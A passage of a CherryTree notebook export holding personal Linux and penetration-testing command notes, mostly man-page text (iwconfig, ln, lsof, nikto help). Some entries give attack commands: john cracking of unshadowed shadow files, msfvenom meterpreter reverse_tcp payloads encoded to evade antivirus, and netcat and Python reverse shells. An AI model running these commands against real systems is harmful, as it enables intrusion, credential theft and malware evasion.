              through  interference  bursts. This parameter sets the maximum fragment size
              which is always lower than the maximum packet size.
              This parameter may also control Frame Bursting available on some cards,  the
              ability  to  send  multiple IP packets together. This mechanism would be en‐
              abled if the fragment size is larger than the maximum packet size.
              You may also set this parameter to auto, fixed or off.
</rich_text>
          <rich_text foreground="#f9f9f0f06b6b">              Examples :
                   iwconfig eth0 frag 512
                   iwconfig eth0 frag off</rich_text>
          <rich_text>

       key/enc[ryption]
              Used to manipulate encryption or scrambling keys and security mode.
              To set the current encryption key, just enter the key in hex digits as </rich_text>
          <rich_text foreground="#f9f9f0f06b6b">XXXX-
              XXXX-XXXX-XXXX</rich_text>
          <rich_text> or </rich_text>
          <rich_text foreground="#f9f9f0f06b6b">XXXXXXXX</rich_text>
          <rich_text>.  To set  a  key  other  than  the  current  key,
              prepend  or append [index] to the key itself (this won't change which is the
              active key). You can also enter the key as an ASCII string by using  the  s:
              prefix. Passphrase is currently not supported.
              To change which key is the currently active key, just enter [index] (without
              entering any key value).
              off and on disable and reenable encryption.
              The  security mode may be open or restricted, and its meaning depends on the
              card used. With most cards, in open mode no authentication is used  and  the
              card may also accept non-encrypted sessions, whereas in restricted mode only
              encrypted  sessions  are  accepted  and  the card will use authentication if
              available.
              If you need to set multiple keys, or set a key and change  the  active  key,
              you  need to use multiple key directives. Arguments can be put in any order,
              the last one will take precedence.
</rich_text>
          <rich_text foreground="#f9f9f0f06b6b">              Examples :
                   iwconfig eth0 key 0123-4567-89
                   iwconfig eth0 key [3] 0123-4567-89
                   iwconfig eth0 key s:password [2]
                   iwconfig eth0 key [2]
                   iwconfig eth0 key open
                   iwconfig eth0 key off
                   iwconfig eth0 key restricted [3] 0123456789
                   iwconfig eth0 key 01-23 key 45-67 [4] key [4]</rich_text>
          <rich_text>

       power  Used to manipulate power management scheme parameters and mode.
              To set the period between wake ups, enter period `value'.  To set the  time‐
              out  before  going back to sleep, enter timeout `value'.  To set the generic
              level of power saving, enter saving `value'.  You can also add the  min  and
              max  modifiers. By default, those values are in seconds, append the suffix m
              or u to specify values in milliseconds  or  microseconds.  Sometimes,  those
              values  are  without  units  (number of beacon periods, dwell, percentage or
              similar).
              off and on disable and reenable power management. Finally, you may  set  the
              power management mode to all (receive all packets), unicast (receive unicast
              packets only, discard multicast and broadcast) and multicast (receive multi‐
              cast and broadcast only, discard unicast packets).
</rich_text>
          <rich_text foreground="#f9f9f0f06b6b">              Examples :
                   iwconfig eth0 power period 2
                   iwconfig eth0 power 500m unicast
                   iwconfig eth0 power timeout 300u all
                   iwconfig eth0 power saving 3
                   iwconfig eth0 power off
                   iwconfig eth0 power min period 2 power max period 4</rich_text>
          <rich_text>

       modu[lation]
              Force  the  card  to use a specific set of modulations. Modern cards support
              various modulations, some which are standard, such as  802.11b  or  802.11g,
              and  some  proprietary. This command force the card to only use the specific
              set of modulations listed on the command line. This can be used to  fix  in‐
              teroperability issues.
              The  list of available modulations depend on the card/driver and can be dis‐
              played using iwlist modulation.  Note that some card/driver may not be  able
              to  select  each  modulation listed independently, some may come as a group.
              You may also set this parameter to auto let the card/driver do its best.
</rich_text>
          <rich_text foreground="#f9f9f0f06b6b">              Examples :
                   iwconfig eth0 modu 11g
                   iwconfig eth0 modu CCK OFDMa
                   iwconfig eth0 modu auto</rich_text>
          <rich_text>

       commit Some cards may not apply changes done through  Wireless  Extensions  immedi‐
              ately (they may wait to aggregate the changes or apply it only when the card
              is  brought up via ifconfig).  This command (when available) forces the card
              to apply all pending changes.
              This is normally not needed, because the  card  will  eventually  apply  the
              changes, but can be useful for debugging.

DISPLAY
       For  each device which supports wireless extensions, iwconfig will display the name
       of the MAC protocol used (name of device  for  proprietary  protocols),  the  ESSID
       (Network  Name), the NWID, the frequency (or channel), the sensitivity, the mode of
       operation, the Access Point address, the bit-rate, the RTS threshold, the  fragmen‐
       tation  threshold,  the encryption key and the power management settings (depending
       on availability).

       The parameters displayed have the same meaning and values as the parameters you can
       set, please refer to the previous part for a detailed explanation of them.
       Some parameters are only displayed in short/abbreviated form (such as  encryption).
       You may use iwlist(8) to get all the details.
       Some  parameters have two modes (such as bitrate). If the value is prefixed by `=',
       it means that the parameter is fixed and forced to that value, if it is prefixed by
       `:', the parameter is in automatic mode and the current value  is  shown  (and  may
       change).

       Access Point/Cell
              An  address  equal  to 00:00:00:00:00:00 means that the card failed to asso‐
              ciate with an Access Point (most likely a configuration issue).  The  Access
              Point  parameter will be shown as Cell in ad-hoc mode (for obvious reasons),
              but otherwise works the same.

       If </rich_text>
          <rich_text foreground="#f9f9f0f06b6b">/proc/net/wireless</rich_text>
          <rich_text> exists, iwconfig will also display  its  content.  Note  that
       those  values  will depend on the driver and the hardware specifics, so you need to
       refer to your driver documentation for proper interpretation of those values.

       Link quality
              Overall quality of the link. May be based on the level of contention or  in‐
              terference,  the  bit  or frame error rate, how good the received signal is,
              some timing synchronisation, or other hardware metric. This is an  aggregate
              value, and depends totally on the driver and hardware.

       Signal level
              Received  signal strength (RSSI - how strong the received signal is). May be
              arbitrary units or dBm, iwconfig uses driver meta information  to  interpret
              the  raw  value  given  by </rich_text>
          <rich_text foreground="#f9f9f0f06b6b">/proc/net/wireless</rich_text>
          <rich_text> and display the proper unit or
              maximum value (using 8 bit arithmetic). In Ad-Hoc mode, this  may  be  unde‐
              fined and you should use iwspy.

       Noise level
              Background  noise level (when no packet is transmitted). Similar comments as
              for Signal level.

       Rx invalid nwid
              Number of packets received with a different NWID or ESSID.  Used  to  detect
              configuration  problems  or  adjacent  network  existence  (on the same fre‐
              quency).

       Rx invalid crypt
              Number of packets that the hardware was unable to decrypt. This can be  used
              to detect invalid encryption settings.

       Rx invalid frag
              Number  of packets for which the hardware was not able to properly re-assem‐
              ble the link layer fragments (most likely one was missing).

       Tx excessive retries
              Number of packets that the hardware failed to deliver.  Most  MAC  protocols
              will retry the packet a number of times before giving up.

       Invalid misc
              Other packets lost in relation with specific wireless operations.

       Missed beacon
              Number of periodic beacons from the Cell or the Access Point we have missed.
              Beacons  are  sent  at  regular intervals to maintain the cell coordination,
              failure to receive them usually indicates that the card is out of range.

AUTHOR
       Jean Tourrilhes - jt@hpl.hp.com

FILES
      </rich_text>
          <rich_text foreground="#f9f9f0f06b6b"> /proc/net/wireless</rich_text>
          <rich_text>

SEE ALSO
       </rich_text>
          <rich_text foreground="#6262a0a0eaea">ifconfig</rich_text>
          <rich_text>(8), </rich_text>
          <rich_text foreground="#6262a0a0eaea">iwspy</rich_text>
          <rich_text>(8), </rich_text>
          <rich_text foreground="#6262a0a0eaea">iwlist</rich_text>
          <rich_text>(8), </rich_text>
          <rich_text foreground="#6262a0a0eaea">iwevent</rich_text>
          <rich_text>(8), </rich_text>
          <rich_text foreground="#6262a0a0eaea">iwpriv</rich_text>
          <rich_text>(8), </rich_text>
          <rich_text foreground="#6262a0a0eaea">wireless</rich_text>
          <rich_text>(7).

wireless-tools                         30 March 2006                           IWCONFIG(8)
</rich_text>
        </node>
      </node>
      <node name="jed" unique_id="96" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285062" ts_lastsave="1686722520">
        <rich_text>TEXT Editor</rich_text>
      </node>
      <node name="john" unique_id="254" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1686355183" ts_lastsave="1686355221">
        <rich_text scale="h1" weight="heavy">$ john
</rich_text>
        <rich_text scale="h1">
</rich_text>
        <rich_text>• create custom wordlist:
  john --wordlist=megacorpone-cewl --rules --stdout &gt;megacorpone-cewl-jtr

• crack shadow hashes:
  unshadow passwd shadow &gt;unshadowed ; john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed ; john --show unshadowed

• crack md5 hashes:
  john --wordlist=/usr/share/wordlists/rockyou.txt --format=RAW-MD5 hashes</rich_text>
      </node>
      <node name="journalctl" unique_id="187" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285829" ts_lastsave="1694571533"/>
      <node name="kill" unique_id="47" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684284239" ts_lastsave="1724728153"/>
      <node name="kismet" unique_id="340" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1724728153" ts_lastsave="1724728226">
        <rich_text scale="h1" weight="heavy">kismet</rich_text>
        <rich_text>

$ kismet
Default host: </rich_text>
        <rich_text foreground="#6262a0a0eaea">127.0.0.1:2501</rich_text>
      </node>
      <node name="kmod" unique_id="165" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285482" ts_lastsave="1684285485"/>
      <node name="last" unique_id="54" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684284298" ts_lastsave="1724728277">
        <rich_text scale="h1" weight="heavy">last</rich_text>
        <rich_text>

$ last

# whatis
last (1)             - show a listing of last logged in users
</rich_text>
      </node>
      <node name="less" unique_id="103" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285107" ts_lastsave="1728900393">
        <rich_text>less &gt; more</rich_text>
      </node>
      <node name="ld" unique_id="395" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1728900393" ts_lastsave="1728900433">
        <rich_text scale="h1" weight="heavy">ld</rich_text>
        <rich_text>
ld (1)               - The GNU linker


ld -lzlib --verbose</rich_text>
      </node>
      <node name="ln" unique_id="218" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684286699" ts_lastsave="1728357285">
        <rich_text>ln (1)               - make links between files

ln -s &lt;source&gt; &lt;link-name&gt;
</rich_text>
        <rich_text foreground="#9a9a99999696">-s, --symbolic              make symbolic links instead of hard links </rich_text>
        <node name="--help" unique_id="377" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1728357203" ts_lastsave="1728357330">
          <rich_text>Usage: ln [OPTION]... [-T] TARGET LINK_NAME 
</rich_text>
          <rich_text weight="heavy">  or:  ln [OPTION]... TARGET 
  or:  ln [OPTION]... TARGET... DIRECTORY 
  or:  ln [OPTION]... -t DIRECTORY TARGET... </rich_text>
          <rich_text>

In the 1st form, create a link to TARGET with the name LINK_NAME. 
In the 2nd form, create a link to TARGET in the current directory. 
In the 3rd and 4th forms, create links to each TARGET in DIRECTORY. 
Create hard links by default, symbolic links with --symbolic. 
By default, each destination (name of new link) should not already exist. 
When creating hard links, each TARGET must exist.  Symbolic links 
can hold arbitrary text; if later resolved, a relative link is 
interpreted in relation to its parent directory. 
 
Mandatory arguments to long options are mandatory for short options too. 
</rich_text>
          <rich_text weight="heavy">      --backup[=CONTROL]      make a backup of each existing destination file 
  -b                          like --backup but does not accept an argument 
  -d, -F, --directory         allow the superuser to attempt to hard link 
                                directories (note: will probably fail due to 
                                system restrictions, even for the superuser) 
  -f, --force                 remove existing destination files 
  -i, --interactive           prompt whether to remove destinations 
  -L, --logical               dereference TARGETs that are symbolic links 
  -n, --no-dereference        treat LINK_NAME as a normal file if 
                                it is a symbolic link to a directory 
  -P, --physical              make hard links directly to symbolic links 
  -r, --relative              with -s, create links relative to link location 
  -s, --symbolic              make symbolic links instead of hard links 
  -S, --suffix=SUFFIX         override the usual backup suffix 
  -t, --target-directory=DIRECTORY  specify the DIRECTORY in which to create 
                                the links 
  -T, --no-target-directory   treat LINK_NAME as a normal file always 
  -v, --verbose               print name of each linked file 
      --help        display this help and exit 
      --version     output version information and exit </rich_text>
          <rich_text>
 
The backup suffix is '~', unless set with --suffix or SIMPLE_BACKUP_SUFFIX. 
The version control method may be selected via the --backup option or through 
the VERSION_CONTROL environment variable.  Here are the values: 
 
  none, off       never make backups (even if --backup is given) 
  numbered, t     make numbered backups 
  existing, nil   numbered if numbered backups exist, simple otherwise 
  simple, never   always make simple backups 
 
Using -s ignores -L and -P.  Otherwise, the last option specified controls 
behavior when a TARGET is a symbolic link, defaulting to -P. 
 
GNU coreutils online help: &lt;https://www.gnu.org/software/coreutils/&gt; 
Report any translation bugs to &lt;https://translationproject.org/team/&gt; 
Full documentation &lt;https://www.gnu.org/software/coreutils/ln&gt; 
or available locally via: info '(coreutils) ln invocation'</rich_text>
        </node>
      </node>
      <node name="locate" unique_id="93" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285042" ts_lastsave="1724698707">
        <rich_text scale="h1" weight="heavy">$ locate
$ plocate</rich_text>
        <rich_text>


$ </rich_text>
        <rich_text foreground="#3333d1d17a7a">locate</rich_text>
        <rich_text> 'bash'

# update database by 'updatedb'
$ </rich_text>
        <rich_text foreground="#3333d1d17a7a">updatedb</rich_text>
      </node>
      <node name="login" unique_id="147" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285365" ts_lastsave="1684285371"/>
      <node name="logname" unique_id="60" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684284453" ts_lastsave="1724728321">
        <rich_text scale="h1" weight="heavy">logname</rich_text>
        <rich_text>

$ logname

# whatis
logname (1)          - print user's login name
</rich_text>
      </node>
      <node name="logout" unique_id="148" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285371" ts_lastsave="1684285374"/>
      <node name="look" unique_id="73" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684284553" ts_lastsave="1724698254">
        <rich_text>look (1)             - display lines beginning with a given string


# Example

$ look ‘hell’ 

hello
hellebore
helehole
.
.
.</rich_text>
      </node>
      <node name="lostat" unique_id="163" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285475" ts_lastsave="1684285479"/>
      <node name="ls" unique_id="118" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285176" ts_lastsave="1684288230">
        <rich_text>ls -AFCX(l)</rich_text>
      </node>
      <node name="lsattr" unique_id="121" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285196" ts_lastsave="1728357522">
        <rich_text scale="h1" weight="heavy">lsattr</rich_text>
        <rich_text>
lsattr (1)           - list file attributes on a Linux second extended file system
lsattr (1)           - list ext2/ext3/ext4 file attributes
</rich_text>
      </node>
      <node name="lshw" unique_id="119" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285183" ts_lastsave="1684285187"/>
      <node name="lsof" unique_id="122" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285201" ts_lastsave="1724728812">
        <rich_text>lsof (8)             - list open files
</rich_text>
        <node name="Example" unique_id="341" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1724728812" ts_lastsave="1724728844">
          <rich_text>       To list all open files, use:

              lsof

       To list all open Internet, x.25 (HP-UX), and UNIX domain files, use:

              lsof -i -U

       To list all open IPv4 network files in use by the process whose PID is 1234, use:

              lsof -i 4 -a -p 1234

       If it's okay for PID 1234 to not exist, or for PID 1234 to not have any open IPv4 network files, add -Q :

              lsof -Q -i 4 -a -p 1234

       Presuming the UNIX dialect supports IPv6, to list only open IPv6 network files, use:

              lsof -i 6

       To list all files using any protocol on ports 513, 514, or 515 of host wonderland.cc.purdue.edu, use:

              lsof -i @wonderland.cc.purdue.edu:513-515

       To list all files using any protocol on any port of mace.cc.purdue.edu (cc.purdue.edu is the default domain), use:

              lsof -i @mace

       To list all open files for login name ``abe'', or user ID 1234, or process 456, or process 123, or process 789, use:

              lsof -p 456,123,789 -u 1234,abe

       To list all open files on device /dev/hd4, use:

              lsof /dev/hd4

       To find the process that has /u/abe/foo open without worrying if there are none, use:

              lsof -Q /u/abe/foo

       To take action only if a process has /u/abe/foo open, use:

              lsof /u/abe/foo  echo "still in use"

       To send a SIGHUP to the processes that have /u/abe/bar open, use:

              kill -HUP `lsof -t /u/abe/bar`

       To find any open file, including an open UNIX domain socket file, with the name /dev/log, use:

              lsof /dev/log

       To find processes with open files on the NFS file system named /nfs/mount/point whose server is inaccessible, and  presuming  your  mount
       table supplies the device number for /nfs/mount/point, use:

              lsof -b /nfs/mount/point

       To do the preceding search with warning messages suppressed, use:

              lsof -bw /nfs/mount/point

       To ignore the device cache file, use:

              lsof -Di

       To obtain PID and command name field output for each process, file descriptor, file device number, and file inode number for each file of
       each process, use:

              lsof -FpcfDi

       To list the files at descriptors 1 and 3 of every process running the lsof command for login ID ``abe'' every 10 seconds, use:

              lsof -c lsof -a -d 1 -d 3 -u abe -r10

       To  list the current working directory of processes running a command that is exactly four characters long and has an 'o' or 'O' in char‐
       acter three, use this regular expression form of the -c c option:

              lsof -c /^..o.$/i -a -d cwd

       To find an IP version 4 socket file by its associated numeric dot-form address, use:

              lsof -i@128.210.15.17

       To find an IP version 6 socket file (when the UNIX dialect supports IPv6) by its associated numeric colon-form address, use:

              lsof -i@[0:1:2:3:4:5:6:7]

       To find an IP version 6 socket file (when the UNIX dialect supports IPv6) by an associated numeric colon-form address that has a  run  of
       zeroes in it - e.g., the loop-back address - use:

              lsof -i@[::1]

       To obtain a repeat mode marker line that contains the current time, use:

              lsof -rm====%T====

       To add spaces to the previous marker line, use:

              lsof -r "m==== %T ===="
</rich_text>
        </node>
      </node>
      <node name="lspci" unique_id="123" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285206" ts_lastsave="1728357443">
        <rich_text scale="h1" weight="heavy">lspci</rich_text>
        <rich_text>
lspci (8)            - list all PCI devices
</rich_text>
      </node>
      <node name="lsusb" unique_id="219" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684286815" ts_lastsave="1728357411">
        <rich_text scale="h1" weight="heavy">lsusb</rich_text>
        <rich_text>
lsusb (8)            - list USB devices
</rich_text>
      </node>
      <node name="macchanger" unique_id="32" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684283791" ts_lastsave="1684283799"/>
      <node name="mail" unique_id="20" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684283574" ts_lastsave="1686722426">
        <rich_text>mail (1)             - send and receive mail</rich_text>
      </node>
      <node name="man" unique_id="90" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285024" ts_lastsave="1686722441">
        <rich_text>man (1)              - an interface to the system reference manuals
</rich_text>
      </node>
      <node name="mkdir" unique_id="114" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285152" ts_lastsave="1684285156"/>
      <node name="mkpasswd" unique_id="253" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1686354590" ts_lastsave="1686354987">
        <rich_text scale="h1" weight="heavy">$ mkpasswd</rich_text>
        <rich_text>

</rich_text>
        <rich_text weight="heavy">shadow file structure: $id$salt$password</rich_text>
        <rich_text>

generate shadow file hash:

mkpasswd -m md5 password salt
mkpasswd -m sha-256 password salt
mkpasswd -m sha-512 password salt

or jusp type

mkpasswd

FOR /etc/shadow file use:
</rich_text>
        <rich_text weight="heavy">$ mkpasswd -m md5</rich_text>
        <rich_text>
or
</rich_text>
        <rich_text weight="heavy">$ mkpasswd -m md5 &lt;password&gt;</rich_text>
      </node>
      <node name="more" unique_id="104" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285110" ts_lastsave="1685695950">
        <rich_text>more &gt; less</rich_text>
      </node>
      <node name="msfconsole" unique_id="16" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684283428" ts_lastsave="1727735848">
        <rich_text scale="h1" weight="heavy">msfconsole (1)       - Metasploit Framework Console</rich_text>
        <rich_text>

search
use
set
show
options
run | exploit
help


</rich_text>
        <rich_text weight="heavy">Ex:</rich_text>
        <rich_text foreground="#6262a0a0eaea">
search proftp 133c
use 0
options
setg rhosts [IP] | (set all rhosts)
set rhosts [IP]
set rport [PORT]
show payloads
set payload [PATH]
set lhost [LOCALIP]
run / exploit</rich_text>
      </node>
      <node name="mfsvenom" unique_id="355" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1725418063" ts_lastsave="1725418622">
        <rich_text scale="h1" weight="heavy">msfvenom</rich_text>
        <rich_text>
Metasploit


• </rich_text>
        <rich_text scale="h1">Basic payload creation with Metasploit in Kali Linux</rich_text>
        <rich_text>
</rich_text>
        <rich_text weight="heavy">Step 1:</rich_text>
        <rich_text> Access Msfconsole
</rich_text>
        <rich_text foreground="#5757e3e38989">msfconsole</rich_text>
        <rich_text>
</rich_text>
        <rich_text weight="heavy">Step 2: </rich_text>
        <rich_text>Access msfvenom
</rich_text>
        <rich_text foreground="#5757e3e38989">msfvenom -h</rich_text>
        <rich_text>
</rich_text>
        <rich_text weight="heavy">Step 3: </rich_text>
        <rich_text>Construct a payload
</rich_text>
        <rich_text foreground="#5757e3e38989">msfvenom -a x86 -platform Windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.9 LPORT=4444 -f exe -o payload.exe</rich_text>
        <rich_text>
</rich_text>
        <rich_text weight="heavy">Step 4:</rich_text>
        <rich_text> We’ll go to the home directory to see where it was generated. The accompanying screenshot shows that was successfully created.


• </rich_text>
        <rich_text scale="h1">Using an Encoder During Payload Generation</rich_text>
        <rich_text>
To  avoid detection by anti-virus software, we can use an encoder while  generating the payload. The encoder goes through the entire target  payload from the data section and transforms each byte with a specific  key.

</rich_text>
        <rich_text foreground="#5757e3e38989">msfvenom -l encoders
msfvenom -a x86 -platform Windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.9 LPORT=4444 -e x86/shikata_ga_nai -f exe -o payload.exe</rich_text>
        <rich_text>


• </rich_text>
        <rich_text scale="h1">Generating Payloads with Multiple Passes</rich_text>
        <rich_text>
We  can also encode the payload multiple times using -i and the number of  times we want to encode it. The more iterations you encode a payload,  the easier it is to avoid antivirus software.

</rich_text>
        <rich_text foreground="#5757e3e38989">msfvenom -a x86 -platform Windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.9 LPORT=4444 -i 10 -e x86/shikata_ga_nai -f exe -o payload.exe</rich_text>
      </node>
      <node name="mv" unique_id="111" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285143" ts_lastsave="1727737182">
        <rich_text scale="h1" weight="heavy">mv</rich_text>
        <rich_text>
mv (1)               - move (rename) files


mv [Path/file.txt] [Path/new_file.txt]		# rename
mv [Path/file.txt] [New_Path/file.txt]		# move
mv [Path/file.txt] [New_Path/new_file.txt]	# move and rename</rich_text>
      </node>
      <node name="nano" unique_id="97" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285066" ts_lastsave="1686722478">
        <rich_text>TEXT Editor</rich_text>
      </node>
      <node name="nbtscan" unique_id="236" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684511699" ts_lastsave="1686722502">
        <rich_text>nbtscan (1)          - scan networks for NetBIOS name information</rich_text>
      </node>
      <node name="ncal" unique_id="134" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285274" ts_lastsave="1684285279"/>
      <node name="ncrack" unique_id="214" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684286339" ts_lastsave="1684286339"/>
      <node name="neofetch" unique_id="64" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684284475" ts_lastsave="1684284482"/>
      <node name="nessus" unique_id="18" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684283529" ts_lastsave="1684283548"/>
      <node name="netcat" unique_id="37" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684283961" ts_lastsave="1729094860">
        <rich_text scale="h1" weight="heavy">$ netcat / nc</rich_text>
        <rich_text>
netcat (1)           - TCP/IP swiss army knife

</rich_text>
        <rich_text weight="heavy">• bind:</rich_text>
        <rich_text>
  nc -nlv &lt;attackerport&gt; (-s &lt;source-ip&gt;) (-p &lt;port&gt;) 

</rich_text>
        <rich_text weight="heavy">• connect:</rich_text>
        <rich_text>
  nc -nv &lt;targetip&gt; &lt;attackerport&gt;

</rich_text>
        <rich_text weight="heavy">• reverse:</rich_text>
        <rich_text>
  nc -e /bin/bash &lt;targetip&gt; &lt;attackerport&gt;



</rich_text>
        <rich_text scale="h3" weight="heavy">sample:</rich_text>
        <rich_text>
</rich_text>
        <rich_text family="monospace">$ nc -nlv -s 192.168.31.136 -p 9090 -e /bin/sh</rich_text>
        <rich_text>

</rich_text>
        <rich_text scale="h3" weight="heavy">Python:</rich_text>
        <rich_text>
</rich_text>
        <rich_text family="monospace">python3 -c 'import os; os.system("nc 192.168.255.128 9000 -e /bin/sh")'</rich_text>
      </node>
      <node name="netdiscover" unique_id="12" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684283354" ts_lastsave="1684283375"/>
      <node name="netstat" unique_id="35" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684283810" ts_lastsave="1684288051">
        <rich_text>netstat -r:route -i:interface -g:groups -s:statics -l:listen -p:program -v:verbose -c:continue_listening -a:all -t:tcp -u:udp</rich_text>
      </node>
      <node name="nikto" unique_id="5" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684283281" ts_lastsave="1727736846">
        <rich_text scale="h1" weight="heavy">nikto</rich_text>
        <rich_text>
nikto (1)            - Scan web server for known vulnerabilities


nikto -h [IP]</rich_text>
        <node name="nikto --help" unique_id="362" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1727736867" ts_lastsave="1727736868">
          <rich_text>Option host requires an argument

   Options:
       -ask+               Whether to ask about submitting updates
                               yes   Ask about each (default)
                               no    Don't ask, don't send
                               auto  Don't ask, just send
       -check6             Check if IPv6 is working (connects to ipv6.google.com or value set in nikto.conf)
       -Cgidirs+           Scan these CGI dirs: "none", "all", or values like "/cgi/ /cgi-a/"
       -config+            Use this config file
       -Display+           Turn on/off display outputs:
                               1     Show redirects
                               2     Show cookies received
                               3     Show all 200/OK responses
                               4     Show URLs which require authentication
                               D     Debug output
                               E     Display all HTTP errors
                               P     Print progress to STDOUT
                               S     Scrub output of IPs and hostnames
                               V     Verbose output
       -dbcheck           Check database and other key files for syntax errors
       -evasion+          Encoding technique:
                               1     Random URI encoding (non-UTF8)
                               2     Directory self-reference (/./)
                               3     Premature URL ending
                               4     Prepend long random string
                               5     Fake parameter
                               6     TAB as request spacer
                               7     Change the case of the URL
                               8     Use Windows directory separator (\)
                               A     Use a carriage return (0x0d) as a request spacer
                               B     Use binary value 0x0b as a request spacer
        -followredirects   Follow 3xx redirects to new location
        -Format+           Save file (-o) format:
                               csv   Comma-separated-value
                               json  JSON Format
                               htm   HTML Format
                               nbe   Nessus NBE format
                               sql   Generic SQL (see docs for schema)
                               txt   Plain text
                               xml   XML Format
                               (if not specified the format will be taken from the file extension passed to -output)
       -Help              This help information
       -host+             Target host/URL
       -id+               Host authentication to use, format is id:pass or id:pass:realm
       -ipv4                 IPv4 Only
       -ipv6                 IPv6 Only
